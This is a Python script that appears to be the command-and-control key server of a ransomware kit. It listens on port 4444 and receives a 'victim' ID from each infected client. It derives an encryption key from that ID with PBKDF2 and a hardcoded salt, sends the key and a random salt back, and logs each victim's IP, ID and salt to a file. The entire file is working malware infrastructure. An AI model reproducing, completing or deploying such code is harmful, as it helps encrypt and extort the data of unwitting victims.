import socket
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os
import sys
#import publicip

salt = os.urandom(32)

kdf = PBKDF2HMAC(
    salt=b'\x7f\xea\xf9,\xf5\xd3\xe3\xc7\xaeA\x18A\x88\xfa\x17ST\nF2}\x15f\xbe\xf4N7\xfcD\xa3\xdb\x95',
    algorithm=hashes.SHA256(),
    iterations=10000,
    length=32,
)

IP = '127.0.0.1'
PORT = 4444
victim_IP = ''
victim_iD = b''
key = b''
#salt = b''

def keyGen(victim_iD):
    return base64.urlsafe_b64encode(kdf.derive(victim_iD.encode()))


sok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sok.bind((IP,PORT))
sok.listen()
print("(+ Server Alive +)")
while True:
            try:
                conn,addr = sok.accept()
                victim_IP = addr
                victim_iD = conn.recv(1024)
                victim_iD = victim_iD.decode()
                print(victim_iD)
                key = keyGen(victim_iD)
                print(key)
                print(salt)
                conn.send(key+b'SALT'+salt)
                clientslog = open('clientslog.log','a+')
                clientslog.write("{}#{}#{}\n".format(victim_IP,victim_iD,salt))
                clientslog.close() 
                break
            except KeyboardInterrupt:
                break